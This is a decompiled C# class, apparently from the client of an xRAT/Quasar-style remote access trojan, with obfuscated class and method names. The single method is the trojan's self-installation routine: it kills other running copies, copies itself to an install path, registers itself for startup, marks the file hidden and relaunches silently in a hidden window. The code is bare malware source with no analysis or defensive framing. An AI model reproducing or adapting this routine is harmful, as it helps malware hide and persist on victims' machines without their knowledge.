using System;
using System.Diagnostics;
using System.IO;
using System.Threading;
using xClient.Core.Networking;

// Token: 0x0200000F RID: 15
public static class GClass13
{
	// Token: 0x06000077 RID: 119 RVA: 0x00005F3C File Offset: 0x0000413C
	public static void smethod_0(Client client)
	{
		bool flag = false;
		if (!Directory.Exists(Path.Combine(GClass35.string_3, GClass35.string_4)))
		{
			try
			{
				Directory.CreateDirectory(Path.Combine(GClass35.string_3, GClass35.string_4));
			}
			catch (Exception)
			{
				GClass0.Disconnect = true;
				return;
			}
		}
		if (File.Exists(GClass0.InstallPath))
		{
			try
			{
				File.Delete(GClass0.InstallPath);
			}
			catch (Exception ex)
			{
				if (ex is IOException || ex is UnauthorizedAccessException)
				{
					Process[] processesByName = Process.GetProcessesByName(Path.GetFileNameWithoutExtension(GClass0.InstallPath));
					int id = Process.GetCurrentProcess().Id;
					foreach (Process process in processesByName)
					{
						if (process.Id != id)
						{
							process.Kill();
							flag = true;
						}
					}
				}
			}
		}
		if (flag)
		{
			Thread.Sleep(5000);
		}
		try
		{
			File.Copy(GClass0.CurrentPath, GClass0.InstallPath, true);
		}
		catch
		{
			GClass0.Disconnect = true;
			return;
		}
		if (GClass35.bool_1 && !GClass16.smethod_1())
		{
			GClass0.AddToStartupFailed = true;
		}
		if (GClass35.bool_2)
		{
			try
			{
				File.SetAttributes(GClass0.InstallPath, FileAttributes.Hidden);
			}
			catch (Exception)
			{
			}
		}
		GClass4.smethod_2(GClass0.InstallPath);
		ProcessStartInfo startInfo = new ProcessStartInfo
		{
			WindowStyle = ProcessWindowStyle.Hidden,
			CreateNoWindow = true,
			UseShellExecute = true,
			FileName = GClass0.InstallPath
		};
		try
		{
			Process.Start(startInfo);
		}
		catch (Exception)
		{
			GClass0.Disconnect = true;
			return;
		}
		GClass0.Disconnect = true;
	}
}
